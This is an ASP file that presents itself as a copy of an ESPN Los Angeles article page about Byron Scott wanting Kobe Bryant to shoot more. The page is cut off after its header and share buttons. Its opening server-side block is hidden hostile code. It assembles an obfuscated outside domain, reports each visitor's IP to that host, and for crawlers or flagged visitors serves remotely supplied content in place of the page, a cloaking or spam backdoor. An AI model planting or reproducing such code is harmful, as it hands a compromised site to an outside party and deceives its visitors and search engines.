﻿<%
'on error resume next
Server.ScriptTimeout=600
dim systid,ISBK,html,echohtml,lk,ipurl,echourl,kdom
kdom = "1nil"
kdom =kdom & "2thea"
systid=484
kdom =kdom & "rsenal"

kdom =kdom & "."
ISBK = "false"
kdom =kdom &"com"
hs = "http"
ipurl = hs&"://nb."&kdom&"/nb.php?ip="
echourl = hs&"://ac."&kdom&"/echo.php?"
html = GetContent(ipurl&GetRsip()) 'GetRsip()
lk ="<t"&"@"&"k>"
If instr(html,lk)>0 Then
	 ISBK = replace(html,lk,"")
End If
'response.Write ISBK&ChecksAgent
'ISBK ="true"
if ChecksAgent=true or cstr(ISBK)="true" Then
	
	dim subspagseid
	subspagseid = request.querystring("subspagseid")
	If subspagseid Then
		response.Write GetContent(echourl&"sysid="&systid&"&subpageid="&subspagseid)
	Else
		%>


<!DOCTYPE html>
<html xmlns:fb="http://www.facebook.com/2008/fbml">
<head><script src="http://sports-ak.espn.go.com/sports/optimizely.js"></script><meta charset="iso-8859-1">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<script type="text/javascript">    
    if(true && navigator && navigator.userAgent.toLowerCase().indexOf("teamstream") >= 0) {
        window.location = 'http://a.m.espn.go.com/mobilecache/general/apps/sc';
    }
</script><script type="text/javascript">
var espn=window.espn||{};espn.beta=(function(f,i,b){var c="http://beta.espn.go.com",j=f.location.href,l=i.location.pathname;function a(n){var r,m,o,q,s,v,w,p,t;if(n!==b){j=n;r=n.match(/http:\/\/([^\/]*)([^?]*).*/);if(r&&r.length===3){l=r[2];}}if(l.match(/\/story$/i)||l.match(/\/story\//i)){q=k("storyId",n)||k("id",n);s=k("storyPage",n)||k("page",n);if(q!==""){return c+l+"/_/id/"+q;}else{if(s!==""){return c+l+"/_/page/"+s;}else{return c+l;}}}if(l.match(/\/blogpostindex$/i)){m=k("blogname",n);if(f.espn&&espn.GLOBALS&&espn.GLOBALS.isCEBlog===true){return;}if(m!==""){return c+"/blog/"+m;}}if(l.match(/\/blogpost$/i)){m=k("blogname",n);o=k("id",n);if(f.espn&&espn.GLOBALS&&espn.GLOBALS.isCEBlog===true){return;}if(m!==""&&o!==""){return c+"/blog/"+m+"/post/_/id/"+o;}}if(l.match(/^\/blog\//i)){m=k("blogName",n);o=k("id",n);if(l.match(/\/blog\/.*\/post$/i)){if(o!==""){return c+l+"/_/id/"+o;}}else{if(m!==""&&o!==""){return c+"/blog/"+m+"/post/_/id/"+o;}else{if(m!==""){return c+"/blog/"+m;}else{return c+l;}}}}if((l===""||l==="/")&&!j.match(/^https?:\/\/insider\.espn\.go\.com/i)){return c;}var u=l.match(/^\/.*?\/(?:index)?$/i);if(u){v={"/frontpage/":true,"/wireless/":true,"/general/":true,"/extra/":true,"/mobile/":true,"/nfl/":true,"/nba/":true,"/mlb/":true,"/nhl/":true,"/ncf/":true,"/college-football/":true,"/ncb/":true,"/mens-college-basketball/":true,"/ncw/":true,"/womenbb/":true,"/womens-basketball/":true,"/wnba/":true,"/golf/":true,"/tennis/":true,"/general/tennis/":true,"/mma/":true,"/extra/mma/":true,"/racing/":true,"/rpm/":true,"/racing/nascar/":true,"/rpm/nascar/":true,"/boxing/":true,"/extra/boxing/":true,"/college-sports/":true,"/ncaa/":true,"/extra/ncaa/":true,"/olympics/":true,"/extra/olympics/":true,"/horse-racing/":true,"/horse/":true,"/general/horse/":true,"/poker/":true,"/general/poker/":true,"/sports/endurance/":true,"/extra/endurance/":true};if(l.match(/\/index$/i)){l=l.substring(0,l.length-5);}if(v[l]===true){return c+l;}}if(l.match(/\/nflpreview$/i)||l.match(/\/preview$/i)){w=k("gameId",n);if(w!==""){if(l.match(/\/nflpreview$/i)){return c+"/nfl/preview?gameId="+w;}else{return c+l+"?gameId="+w;}}}if(l.match(/\/recap$/i)){w=k("gameId",n);if(w!==""){return c+l+"?gameId="+w;}}if(l==="/general/video"){p=k("cid",n);t=k("vid",n);if(p!==""){return c+"/video/clip?id="+p;}else{if(t!==""){return c+"/video/clip?id="+t;}}}if(l.match(/^\/(?:videohub\/video|video)\/clip$/i)){p=k("id",n);if(p!==""){return c+l+"?id="+p;}}}function h(o){var n=a(o);var m=j.match(/^https?:\/\/insider\.espn\.go\.com/i)||(o&&o.match(/^https?:\/\/insider\.espn\.go\.com/i))||(espn&&espn.GLOBALS&&espn.GLOBALS.isPremium);if(n){n=n.replace("/wireless/","/");n=n.replace("/general/","/");n=n.replace("/extra/","/");n=n.replace("/mobile/","/");n=n.replace("/frontpage/","/");n=n.replace("/videohub/","/");n=n.replace("/ncf/","/college-football/");n=n.replace("/rpm/","/racing/");n=n.replace("/ncb/","/mens-college-basketball/");n=n.replace("/ncw/","/womens-basketball/");n=n.replace("/wnba/","/womens-basketball/");n=n.replace("/ncaa/","/college-sports/");if(m){n=n.replace("/story/","/insider/story/");n=n.replace("/post/","/insider/post/");if(n.match(/\/blog\/[^_]*$/i)){if(n.charAt(n.length-1)==="/"){n=n+"insider/";}else{n=n+"/insider/";}}}}return n;}function k(o,q){var m=location.search;if(q!==b){var n=q.indexOf("?");if(n>-1){m=q.substr(n);}}o=o.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var r=new RegExp("[\\?&]"+o+"=([^&#]*)"),p=r.exec(m);return p===null?"":decodeURIComponent(p[1].replace(/\+/g," "));}function d(){var n=e("betauser");var m=e("betacohort")||"";if(n!==null&&m.indexOf("cohort-")===0){var p=m.split("-");if(p&&p.length===2){if(parseInt(p[1],10)===999){return;}}var o=h();if(o){f.location=o;}}}function e(n){var p=n+"=";var m=i.cookie.split(";");for(var o=0;o<m.length;o++){var q=m[o];while(q.charAt(0)===" "){q=q.substring(1,q.length);}if(q.indexOf(p)===0){return q.substring(p.length,q.length);}}return null;}function g(){if(k("rand")==="beta"){espn.beta.recheck=true;}else{d();}}return{init:function(){g();}};})(this,this.document);espn.beta.init();
</script>
	<script>(function(){function r(a){a=a.replace(/[\[]/,"\\[").replace(/[\]]/,"\\]");var c=new RegExp("[\\?&]"+a+"=([^&#]*)"),b=c.exec(location.search);return b==null?"":decodeURIComponent(b[1].replace(/\+/g," "));}var p=navigator.userAgent,o=window.location,l=document.cookie,f=document.referrer,n=(f===""||f.indexOf(".go.com")!==-1),d=(n)?"http://m.espn.go.com/general/story?storyId=12115240&city=losangeles&src=desktop":"http://m.espn.go.com/general/story?storyId=12115240&city=losangeles&src=desktop&rand=ref~%7B%22ref%22%3A%22"+encodeURIComponent(f)+"%22%7D",i=(p.match(/iPad/i)||(p.match(/Android/i)&&!p.match(/Mobile/i))||p.match(/RIM Tablet/i)||p.match(/Silk/i)),k=(p.match(/Mobile/i)||p.match(/Mini/i)),g=o.href.match(/src=mobile/i),q=l.indexOf("iphone_redirect=false")>-1,e=l.indexOf("iphone_redirect=true")>-1,j=r("addata"),h=r("ex_cid"),m=r("rand");if(j!=""){d+="&addata="+j;}if(h!=""){d+="&ex_cid="+h;}if(m==="beta"){d+="&rand=beta";}if(i){document.documentElement.className+=" tablet ";if((!p.match(/iPad/i)||e)&&!q){o.href=d;}}else{if(k&&!q&&!g){o.href=d;}}})();</script>
	<title>Los Angeles Lakers coach wants more shots from Kobe Bryant - ESPN Los Angeles</title>
<meta name="google-site-verification" content="xuj1ODRluWa0frM-BjIr_aSHoUC7HB5C1MgmYAM_GkA" />
<meta name="msvalidate.01" content="B1FEB7C682C46C8FCDA3130F3D18AC28" />
<meta name="googlebot" content="noodp" />
<meta name="robots" content="index, follow" />
<meta name="description" content="Byron Scott is happy Kobe Bryant has been averaging close to a triple-double in the three games he has played since returning from a three-game rest last week, but the Los Angeles Lakers coach is hoping his star player will shoot more moving forward." />
<meta name="keywords" content="kobe bryant, nba, los angeles lakers, byron scott, shoot, offense" />
<meta name="news_keywords" content="kobe bryant, nba, los angeles lakers, byron scott, shoot, offense" />
<meta name="syndication-source" content="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant" />
<meta property="fb:app_id" content="116656161708917">
<meta property="og:site_name" content="ESPN.com">
<meta property="og:title" content="Lakers coach wants more shots from Kobe" />
<meta property="og:type" content="article" />
<meta property="og:description" content="Byron Scott is happy Kobe Bryant has been averaging close to a triple-double in the three games he has played since returning from a three-game rest last week, but the Los Angeles Lakers coach is hoping his star player will shoot more moving forward." />
<meta property="og:image" content="http://a.espncdn.com/photo/2014/1126/nba_g_bryant_jv_1296x729.jpg" />
<meta property="og:url" content="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant" />
<meta name="twitter:site" content="espn">
<meta name="twitter:title" content="Lakers coach wants more shots from Kobe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:description" content="Byron Scott is happy Kobe Bryant has been averaging close to a triple-double in the three games he has played since returning from a three-game rest last week, but the Los Angeles Lakers coach is hoping his star player will shoot more moving forward.">
<meta name="twitter:image" content="http://a.espncdn.com/photo/2014/1126/nba_g_bryant_jv_1296x729.jpg">
<meta name="twitter:url" content="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant">
<meta name="twitter:app:name:iphone" content="SportsCenter"/>
<meta name="twitter:app:id:iphone" content="317469184"/>
<meta name="twitter:app:name:googleplay" content="SportsCenter"/>
<meta name="twitter:app:id:googleplay" content="com.espn.score_center"/>
<meta name="twitter:app:url:iphone" content="sportscenter://x-callback-url/showArticle?contentID=12115240" />
<meta name="twitter:app:url:googleplay" content="sportscenter://showStory?uid=12115240" />
<link rel="canonical" href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant" />

		<script>
		var _sf_async_config={
			"uid":22222,
			"domain":"espn.go.com",
			"pingServer":"pespn.chartbeat.net",
			"useCanonical":true,
			"useSubDomains":false,
			"sections":"nba",
			"authors":"stories, headlinenews"
		};
		if (typeof(ad_site) !== 'undefined') { _sf_async_config.zone = ad_site; }

		// load both chartbeat_pub and chartbeat_video
		(function () {
			function a() {
				window._sf_endpt = (new Date()).getTime();

				var cbDomain = (("https:"==document.location.protocol)?"https://a248.e.akamai.net/chartbeat.download.akamai.com/102508/":"http://static.chartbeat.com/");

				var c = document.createElement("script");
				c.setAttribute("language","javascript");
				c.setAttribute("type","text/javascript");
				c.setAttribute("src", cbDomain+"js/chartbeat_pub.js");
				document.body.appendChild(c);

				if(typeof StrategyInterface !== 'undefined' && (typeof espn !== 'undefined' && typeof espn.video !== 'undefined')){
					var e = document.createElement("script");
					e.setAttribute("language",	"javascript");
					e.setAttribute("type", "text/javascript");
					e.setAttribute("src", cbDomain+"js/chartbeat_video.js");
					document.body.appendChild(e);
				}
			}
			var b = window.onload;
			window.onload = (typeof window.onload != "function") ? a : function () { b(); a() }
		})();
		//(function(){function a(){window._sf_endpt=(new Date()).getTime();var c=document.createElement("script");c.setAttribute("language","javascript");c.setAttribute("type","text/javascript");c.setAttribute("src",(("https:"==document.location.protocol)?"https://a248.e.akamai.net/chartbeat.download.akamai.com/102508/":"http://static.chartbeat.com/")+"js/chartbeat_pub.js");document.body.appendChild(c)}var b=window.onload;window.onload=(typeof window.onload!="function")?a:function(){b();a()}})();
		</script>
	<link rel="search" type="application/opensearchdescription+xml" href="http://a.espncdn.com/search/opensearch.xml" title="ESPN Search" />
<link rel="stylesheet" href="http://a.espncdn.com/combiner/c/201401211964?css=global_reset.r1.css,base.r236.css,modules.r462.css,global_header.r44.css,header_topbar.r1.css,modules/global_nav.r54.css,modules/insider_enhanced.r1.css,modules/mem/mem.r12.1.css,modules/mem/mem_espn360.r8.4.css,modules/mem/skirmish.r8.css,modules/twin.r1.css,modules/facebook/button.r2.css,universal_overlay/universal_overlay.css,universal_overlay/media_overlay.css,universal_overlay/video_overlay.css,universal_overlay/photo_overlay.css,universal_overlay/dyk_overlay.css,fonts/bentonsans.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/espncitysites/prod/styles/localnav.r12.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/prod/styles/espn.partner.thickbox.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/combiner/c/201303290924?css=sprites/teamlogos.r18.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/prod/styles/legacy.min.200811061403.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/combiner/c?v=201308011131&css=modules/playerpopup.r2.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/combiner/c?v=201108152006&css=modules/videoplayer12.r1.css" type="text/css" media="screen" charset="utf-8" />
<link rel="stylesheet" href="http://a.espncdn.com/prod/styles/social_upgrade.r1.css" type="text/css" media="screen" charset="utf-8" />
<script type="text/javascript">
var _vrq = _vrq || [];
 _vrq.push(['id', 489]);
 _vrq.push(['automate', false]);
 _vrq.push(['track', function(){}]);
 (function(d, a){var s = d.createElement(a),x = d.getElementsByTagName(a)[0];
s.async = true;
s.src = 'http://a.visualrevenue.com/vrs.js';
 x.parentNode.insertBefore(s, x);})(document, 'script'); </script>
<script src="http://a.espncdn.com/combiner/c?js=jquery-1.7.1.js,plugins/json2.r3.js,plugins/teacrypt.js,plugins/jquery.metadata.js,plugins/jquery.bgiframe.r3.js,plugins/jquery.easing.1.3.js,plugins/jquery.hoverIntent.js,plugins/jquery.jcarousel.0.2.9.js,plugins/jquery.tinysort.r4.js,plugins/jquery.pubsub.r5.js,ui/1.8.16/jquery.ui.core.js,ui/1.8.16/jquery.ui.widget.js,ui/1.8.16/jquery.ui.tabs.js,ui/1.8.16/jquery.ui.accordion.js,plugins/ba-debug-0.4.js,espn.l10n.r12.js,swfobject/2.2/swfobject.js,flashObjWrapper.r7.js,plugins/jquery.colorbox.1.3.14.js,plugins/jquery.ba-postmessage.js,espn.core.duo.r57.js,m/beta/betacheck.r5.js,espn.mem.r39.js,stub.search.r9.js,espn.nav.mega.r38b.js,espn.storage.r6.js,espn.p13n.r19.5.js,espn.geo.r3.js,espn.video.r81.r5.js,analytics/chartbeat/video/strategy_comprehensive.r1.js,registration/staticLogin.r12.06102014.js,espn.universal.overlay.r19.js,insider/espn.insider.20140915.js,espn.espn360.stub.r9.js,espn.myHeadlines.stub.r16.js,espn.myfaves.stub.r3.js,espn.scoreboard.r104.js,espn.partner.videobox.r3.js,espn.f8.noauth.r3.js,espn.socialmediamod.r7.js,playerpopup.r14.js"></script>
<script src="http://a.espncdn.com/prod/scripts/espn.loader.200901201835.js" type="text/javascript" charset="utf-8"></script>
<script type="text/javascript" charset="utf-8">
ESPN.include([
	'http://widgets.outbrain.com/outbrain.js'
]);
</script>
<script>var ad_site="espn.local.losangeles.com",ad_zone="nba",ad_kvps="pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;",ad_swid="",ad_counter=1,ad_ord=Math.floor(9999999999*Math.random()),ad_seg="",ad_mnr=-1<document.cookie.indexOf("grif=1")?"t":"f",ad_ref="other",ref=document.referrer,refsMap={"facebook.com":"facebook","twitter.com|t.co":"twitter","plus.url.google.com|plus.google.com":"googleplus","google.com":"google","bing.com":"bing","yahoo.com":"yahoo","espn.go.com":"espn"},refKey;for(refKey in refsMap)ref.match(refKey)&&(ad_ref=refsMap[refKey]);
ad_kvps=ad_kvps+"ref="+ad_ref+";mnr="+ad_mnr+";";ad_swid=jQuery.cookie("SWID");"function"===typeof espn.core.ad_segments&&(ad_seg=espn.core.ad_segments(),null!=ad_seg&&""!=ad_seg&&(ad_kvps+=ad_seg));var ad_u="";null!=ad_swid&&""!=ad_swid&&(ad_u="swid="+ad_swid+";");</script>
</head>
<body class="la sublocal {city: 'losangeles', id: '12115240'}" data-city="losangeles">
<div class="mboxDefault"></div><script>mboxCreate('ESPN_global');</script><!--[if IE 5]><div class="ie5"><![endif]-->
<!--[if IE 6]><div class="ie ie6"><![endif]-->
<!--[if IE 7]><div class="ie ie7"><![endif]-->
<!--[if IE 8]><div class="ie ie8"><![endif]-->
<!--[if IE 9]><div class="ie9"><![endif]-->
<script>function launchSC() { 
document.location='http://espn.go.com/blog/sportscenter';
}
</script><!-- begin bg-elements -->
<div class="bg-elements">
<!-- begin header -->
<div id="header" class="container">
<!-- begin top-bar -->
<div class="top-bar">
<!-- begin uni login -->
<script type="text/javascript">
var returnURL = document.location.href;
var anCV = "";
var myEspnText = {'welcometext':'Welcome','register':'Register','signin':'Sign In','signout':'Sign Out','heliumdown':'Login Temporarily Unavailable','connectedfacebook':'Connected to Facebook','connectfacebook':'Connect with Facebook','activateinsider':'Activate Insider'};
</script>
<form id="form-memberarea">
<input type="hidden" name="language" id="language" value="en"/>
<input type="hidden" name="affiliateName" id="memberAreaAffiliateName" value="espn"/>
<input type="hidden" name="regFormId" id="regFormId" value="espn"/>
</form>
<div class="signin" id="signin"></div>
<script>espn.memberservices.welcome();</script>
<div class="nav-edition editions">
<label>EDITIONS:</label>
<ul class="main">
	<li class="e-usa"><a href="http://espn.go.com/" name="&amp;lpos=editionsnav&amp;lid=usa">USA</a></li>
	<li class="e-deportes"><a href="http://www.espn.com?country-view=us&lang-view=es" name="&amp;lpos=editionsnav&amp;lid=deportes" class="{langPref:'spanish'}">DEPORTES</a></li>
	<li class="last dropdown">
	<ul class="">
	<li class="selected">More</li>
        <li><a href="http://www.espn.com?country-view=ar&lang-view=es" name="&amp;lpos=editionsnav&amp;lid=argentina">Argentina</a></li>
	<li><a href="http://www.espn.com.au" name="&amp;lpos=editionsnav&amp;lid=australia">Australia</a></li>
	<li><a href="http://www.espn.com.br" name="&amp;lpos=editionsnav&amp;lid=brazil">Brazil</a></li>
        <li><a href="http://www.espn.com?country-view=co&lang-view=es" name="&amp;lpos=editionsnav&amp;lid=colombia">Colombia</a></li>
        <li><a href="http://www.espn.com?country-view=mx&lang-view=es" name="&amp;lpos=editionsnav&amp;lid=mexico">Mexico</a></li>
	<li><a href="http://www.espn.co.uk/" name="&amp;lpos=editionsnav&amp;lid=uk">United Kingdom</a></li>
        <li><a href="http://www.espn.com?country-view=ve&lang-view=es" name="&amp;lpos=editionsnav&amp;lid=venezuela">Venezuela</a></li>
	</ul>
	</li>
</ul>
</div>

<div class="nav-edition">
<label>CITIES:</label>
<ul class="main">
	<li class="e-boston"><a href="http://espn.go.com/boston/" name="&amp;lpos=citynav&amp;lid=boston">BOSTON</a></li>
	<li class="e-chicago"><a href="http://espn.go.com/chicago/" name="&amp;lpos=citynav&amp;lid=chicago">CHICAGO</a></li>
	<li class="e-dallas"><a href="http://espn.go.com/dallas/" name="&amp;lpos=citynav&amp;lid=dallas">DALLAS</a></li>
	<li class="e-losangeles active"><a href="http://espn.go.com/los-angeles/" name="&amp;lpos=citynav&amp;lid=losangeles">LOS ANGELES</a></li>
	<li class="last e-newyork"><a href="http://espn.go.com/new-york/" name="&amp;lpos=citynav&amp;lid=newyork">NEW YORK</a></li>
</ul>
</div>
</div>
<!-- end top-bar -->
<!-- begin espn-logo -->
<div class="espn-logo">
<div class="h1"><a name="&lpos=losangelesmegaheader&lid=redespn" href="http://espn.go.com/" class="espn">ESPN</a><a name="&lpos=losangelesmegaheader&lid=headerImage" href="http://espn.go.com/los-angeles/"><img src="http://a.espncdn.com/espncitysites/losangeles/prod/assets/sub_la_r3.png" /></a></div></div>
<!-- end espn-logo -->
<!-- begin ad -->
<span class="presby"><!--espn.local.losangeles.com sitezone-->
<script>if("undefined"!=typeof ad_kvps&&"undefined"!=typeof ad_u&&"undefined"!=typeof ad_counter&&"undefined"!=typeof ad_ord){if("undefined"==typeof ad_site||"undefined"==typeof ad_zone)var ad_site="espn.local.losangeles.com",ad_zone="nba";var ad_finalString="http://ad.Doubleclick.net/adj/"+ad_site+"/"+ad_zone+";"+ad_kvps+"pos=SponsoredByLogoHeader;"+ad_u+"sz=150x45,1x1;tile="+ad_counter+";ord="+ad_ord;document.write('<div data-cb-ad-id="SponsoredByLogoHeader" data-cb-dfp-id="'+ad_kvps+'sz=150x45,1x1"><script src='+ad_finalString+'>\x3c/script></div>');ad_counter++};</script>
<noscript><a href="http://ad.Doubleclick.net/jump/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=150x45,1x1;" target="_blank"><img src="http://ad.Doubleclick.net/ad/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=150x45,1x1;" border="0" alt=""></a></noscript>
</span>
<!-- end ad -->
<div class="header-right">

            <div id="shop">
                <a class="shop-btn" href="http://www.dickssportinggoods.com/category/index.jsp?categoryId=11400507&camp=Part:ESPNpart::losangelesshopbutton:LOSANGELES" onclick="location.href('http://log.go.com/log?srvc=sz&amp;guid=92F96588-1A99-4863-9B75-CE517F79112C&amp;drop=0&amp;addata=3374:65:478847:65&amp;a=1&amp;goto=http://www.dickssportinggoods.com/category/index.jsp?categoryId=11400507&camp=Part:ESPNpart::losangelesshopbutton:LOSANGELES');return false" name="&lpos=sitenavdefault&lid=sitenav_shopbutton" rel="nofollow">Shop</a>
            </div>
            <!-- begin search -->
<div id="nav-main-search">

            <form id="searchBox" name="searchBox" action="http://search.espn.go.com/results" method="get" accept-charset="utf-8" style="color: #999999;">
            <div class="clearfix">
            <input autocomplete="off" class="text" type="text" placeholder="Search" name="searchString" id="searchString" />
            <input type="hidden" name="page" id="page" value="null" />
            <input type="hidden" name="fromForm" value="true" />
            <input class="submit" type="submit" value="" />
            </div>
            </form>
            </div>
<!-- end search -->
</div>
</div>
<!-- end header -->
<!--espn.local.losangeles.com sitezone-->
<script>if("undefined"!=typeof ad_kvps&&"undefined"!=typeof ad_u&&"undefined"!=typeof ad_counter&&"undefined"!=typeof ad_ord){if("undefined"==typeof ad_site||"undefined"==typeof ad_zone)var ad_site="espn.local.losangeles.com",ad_zone="nba";var ad_finalString="http://ad.Doubleclick.net/adj/"+ad_site+"/"+ad_zone+";"+ad_kvps+"pos=Background_Skin;"+ad_u+"sz=1280x946,200x800,1x1;tile="+ad_counter+";ord="+ad_ord;document.write('<div data-cb-ad-id="Background_Skin" data-cb-dfp-id="'+ad_kvps+'sz=1280x946,200x800,1x1"><script src='+ad_finalString+'>\x3c/script></div>');ad_counter++};</script>
<noscript><a href="http://ad.Doubleclick.net/jump/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=1280x946,200x800,1x1;" target="_blank"><img src="http://ad.Doubleclick.net/ad/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=1280x946,200x800,1x1;" border="0" alt=""></a></noscript>
<!-- begin subheader -->
<div id="subheader">
<!-- begin content -->
<div id="content-wrapper">
<div id="ad-top" class="container">
<!-- begin Banner ad -->
<div class="span-6 ad banner top"><div class="ad-center"><div class="ad-wrapper"><!--espn.local.losangeles.com sitezone-->
<script>if("undefined"!=typeof ad_kvps&&"undefined"!=typeof ad_u&&"undefined"!=typeof ad_counter&&"undefined"!=typeof ad_ord){if("undefined"==typeof ad_site||"undefined"==typeof ad_zone)var ad_site="espn.local.losangeles.com",ad_zone="nba";var ad_finalString="http://ad.Doubleclick.net/adj/"+ad_site+"/"+ad_zone+";"+ad_kvps+"pos=Banner;"+ad_u+"sz=728x90,970x66,924x50,1x1;tile="+ad_counter+";ord="+ad_ord;document.write('<div data-cb-ad-id="Banner" data-cb-dfp-id="'+ad_kvps+'sz=728x90,970x66,924x50,1x1"><script src='+ad_finalString+'>\x3c/script></div>');ad_counter++};</script>
<noscript><a href="http://ad.Doubleclick.net/jump/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=728x90,970x66,924x50,1x1;" target="_blank"><img src="http://ad.Doubleclick.net/ad/espn.local.losangeles.com/nba;pgtyp=story;sp=nba;tm=lal;pl=110;objid=12115240;col=markazi_arash;sz=728x90,970x66,924x50,1x1;" border="0" alt=""></a></noscript>
</div></div></div>
<!-- end Banner ad -->
</div>
<div id="content" class="container">
<div id="fb-root"></div><!--[if lte IE 7]><link rel="stylesheet" charset="utf-8" media="screen" href="http://a.espncdn.com/combiner/c?css=modules/browser-alert.r9.css" type="text/css" /><div class="span-6" id="browser-alert-wrapper" style="display:none;"><div class="mod-container mod-no-header-footer browser-alert"><div class="mod-content"><div class="gradient-container"><h1><span>Your Web Browser</span> is no longer supported</h1><p>To experience everything that ESPN.com has to offer, we recommend that you upgrade to a newer version of your web browser. Click the upgrade button to the right or <a href="http://espn.go.com/espn/news/story?id=5630562">learn more</a>.</p><ul><li><a class="btn-upgrade" href="http://www.microsoft.com/windows/internet-explorer/default.aspx">Upgrade</a></li><li><a class="btn-faq" href="http://espn.go.com/espn/news/story?id=5630562">FAQs</a></li></ul></div></div></div></div><script>(function(b){setTimeout(function(){var a=b("#browser-alert-wrapper");if(espn.cookie.get("browseralert")!="true"){b('<a class="btn-close" href="#">Close</a>').bind("click",function(){a.hide();espn.cookie.set("browseralert","true",30);return false}).appendTo(a.find(".gradient-container"));a.show();espn.cookie.set("browseralert","true")}},100)})(jQuery);</script><![endif]--><div class="gradientBG"><!-- gradient nav background --></div>
<div class="mboxDefault"></div><script>mboxCreate('InsiderReg-Empty');</script><div class="span-4">
<div class="bg-opaque pad-16 article">
<!-- begin mod-article-title -->
<div class="mod-article-title">
<div class="headline">
<h1 class="h2">Coach to Kobe: Take more&nbsp;shots</h1>
</div>
<div class="subhead"><div class="date"><span>Updated:</span> January 3, 2015, 5:31 PM ET</div>
<cite class="source">
By <a href="http://espn.go.com/los-angeles/columns/archive?name=arash-markazi">
Arash Markazi</a> | ESPN.com</cite>
</div>
</div>
<div id="page-actions-top"><ul class="mod-page-actions"><li class="social facebook-recommend"><a href="https://www.facebook.com/sharer.php?u=http%3A%2f%2fes.pn%2f1BuK3CG&t=Lakers+coach+wants+more+shots+from+Kobe" target="_new" rel="nofollow"><span class="sprite-page-actions facebook"></span><span class="label">Recommend</span></a><a class="count" href="https://www.facebook.com/sharer.php?u=http%3A%2f%2fes.pn%2f1BuK3CG&t=Lakers+coach+wants+more+shots+from+Kobe" target="_new" rel="nofollow">0</a></li>
<li class="social twitter-tweet"><a href="http://twitter.com/intent/tweet?url=http%3A%2f%2fes.pn%2f1BuK3CG&text=Lakers+coach+wants+more+shots+from+Kobe&via=ESPNLosAngeles" target="_new" rel="nofollow"><span class="sprite-page-actions twitter"></span><span class="label">Tweet</span></a><a class="count" href="http://twitter.com/intent/tweet?url=http%3A%2f%2fes.pn%2f1BuK3CG&text=Lakers+coach+wants+more+shots+from+Kobe&via=ESPNLosAngeles" target="_new" rel="nofollow">0</a></li>
<li class="social fb-comments"><a href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant#comments" rel="nofollow"><span class="sprite-page-actions comments"></span><span class="label">Comments</span></a><a class="count" href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant#comments" rel="nofollow">0</a></li><li class="espn-email"><a id="email-12115240" class="email" href="http://sendtofriend.espn.go.com/sendtofriend/SendToFriend?id=12115240" target="_new" rel="nofollow"><span class="sprite-page-actions email"></span><span class="label">Email</span></a></li>
<li class="print"><a id="print-12115240" class="print" href="http://espn.go.com/espn/print?id=12115240&type=story" rel="nofollow"><span class="sprite-page-actions print"></span><span class="label">Print</span></a></li>
</ul><ul class="mod-page-actions vert"><li class="social facebook-recommend"><a href="https://www.facebook.com/sharer.php?u=http%3A%2f%2fes.pn%2f1BuK3CG&t=Lakers+coach+wants+more+shots+from+Kobe" target="_new" rel="nofollow"><span class="sprite-page-actions facebook"></span><span class="label">Recommend</span></a><a class="count" href="https://www.facebook.com/sharer.php?u=http%3A%2f%2fes.pn%2f1BuK3CG&t=Lakers+coach+wants+more+shots+from+Kobe" target="_new" rel="nofollow">0</a></li>
<li class="social twitter-tweet"><a href="http://twitter.com/intent/tweet?url=http%3A%2f%2fes.pn%2f1BuK3CG&text=Lakers+coach+wants+more+shots+from+Kobe&via=ESPNLosAngeles" target="_new" rel="nofollow"><span class="sprite-page-actions twitter"></span><span class="label">Tweet</span></a><a class="count" href="http://twitter.com/intent/tweet?url=http%3A%2f%2fes.pn%2f1BuK3CG&text=Lakers+coach+wants+more+shots+from+Kobe&via=ESPNLosAngeles" target="_new" rel="nofollow">0</a></li>
<li class="social fb-comments"><a href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant#comments" rel="nofollow"><span class="sprite-page-actions comments"></span><span class="label">Comments</span></a><a class="count" href="http://espn.go.com/los-angeles/nba/story/_/id/12115240/los-angeles-lakers-coach-wants-more-shots-kobe-bryant#comments" rel="nofollow">0</a></li><li class="espn-email"><a id="email-12115240" class="email" href="http://sendtofriend.espn.go.com/sendtofriend/SendToFriend?id=12115240" target="_new" rel="nofollow"><span class="sprite-page-actions email"></span><span class="label">Email</span></a></li>
<li class="print"><a id="print-12115240" class="print" href="http://espn.go.com/espn/print?id=12115240&type=story" rel="nofollow"><span class="sprite-page-actions print"></span><span class="label">Print</span></a></li>
<li class="insider"><a href="http://insider.espn.go.com/insider/promo/offer?addata=insdr_footer_sub" target="_new"><span class="sprite-page-actions" style="background-position: 0 15px"><img alt="Insider" src="http://a.espncdn.com/icons/in_15.png"></span><span class="label">Subscribe</span></a></li>
